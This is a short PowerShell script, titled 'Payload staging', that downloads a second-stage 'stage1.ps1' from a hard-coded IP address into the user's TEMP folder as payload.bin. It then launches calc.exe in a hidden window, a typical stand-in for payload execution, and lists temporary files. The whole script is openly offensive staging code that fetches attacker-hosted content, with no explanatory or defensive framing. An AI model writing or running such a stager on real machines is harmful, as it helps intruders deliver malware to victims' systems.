<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://198.51.100.78:443/stage1.ps1',
    [string]$DropPath = "$env:TEMP\payload.bin",
    [int]$TransferTimeout = 104
)
Invoke-WebRequest -Uri $Stage1Url -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Set-Location -Path $env:TEMP
